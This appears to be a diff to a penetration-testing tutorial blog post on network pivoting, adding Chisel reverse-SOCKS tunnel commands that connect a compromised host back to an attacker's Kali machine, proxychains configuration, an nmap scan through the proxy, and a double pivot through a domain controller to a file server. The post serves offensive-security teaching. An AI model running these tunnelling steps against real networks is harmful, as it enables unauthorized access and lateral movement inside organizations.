@@ -97,11 +97,47 @@ The above starts Chisel as a client on the victim, and connects back to our Kali
 + 10.10.15.100:80 : The IP address and port, separated by a colon, of our Kali machine
 + R:1080:socks : A reverse proxy, using port 1080, using a SOCKS proxy. Important! Port 1080 is the port we used in our /etc/proxychains4.conf file, and must match!
 
+If properly setup, we will have a connection from our client:
+
+<img src="/images/posts/pivoting/Pivoting-Part2-Final.PNG" alt="pivoting-part2-chisel-2080" width="800"/>
+
 Once the client is connected, we can begin to tunnel our traffic into the second network, 172.18.2.0/24, and has access to DC02:
 
-<img src="/images/posts/pivoting/Pivoting-Chisel-1080.PNG" alt="pivoting-part2-chisel-1080" width="700"/>
+<img src="/images/posts/pivoting/chisel-client.PNG" alt="pivoting-part2-chisel-client" width="400"/>
+
+And a connection to our server:
+
+<img src="/images/posts/pivoting/chisel-server.PNG" alt="pivoting-part2-chisel-server" width="400"/>
+
+<h3>Using Pivot</h3>
+
+In order to send traffic through our Chisel proxy, we must use poroxychains command:
+
+{% highlight bash linenos %}
+proxychains -q nmap -Pn 172.18.2.15
+{% endhighlight %}
+
+The above command will use proxychains configuration to send traffic through our SOCKS proxy to our target machine. As a bonus, the nmap -Pn flag will complete nmap scans for us.
 
 <h3>Double Chisel Pivot!</h3>
 
 Now that we have one chisel agent running, assume we compromised DC02, and now found a final machine, FS01. Assume that FS01 is within our third network, 172.18.3.0/24:
 
+<img src="/images/posts/pivoting/Pivoting-Part2-FS01.PNG" alt="pivoting-part2-chisel-fs01" width="800"/>
+
+We can perform a double pivot, and reach this network with another Chisel pivot. With our first pivot running, we must add another line to our /etc/proxychains4.conf file, under our first change:
+
+{% highlight bash linenos %}
+socks5 127.0.0.1 1080
+socks5 127.0.0.1 2080
+{% endhighlight %}
+
+With the above completed, we can then download or copy chisel.exe to DC02 in the same manner as before, and connect similar to our first pivot:
+
+{% highlight bash linenos %}
+./chisel.exe client 10.10.15.100:80 R:2080:socks
+{% endhighlight %}
+
+Now that we have our second chisel client connected, we can now hit our final target machine, FS01:
+
+<img src="/images/posts/pivoting/Pivoting-Part2-Final.PNG" alt="pivoting-part2-chisel-2080" width="800"/>
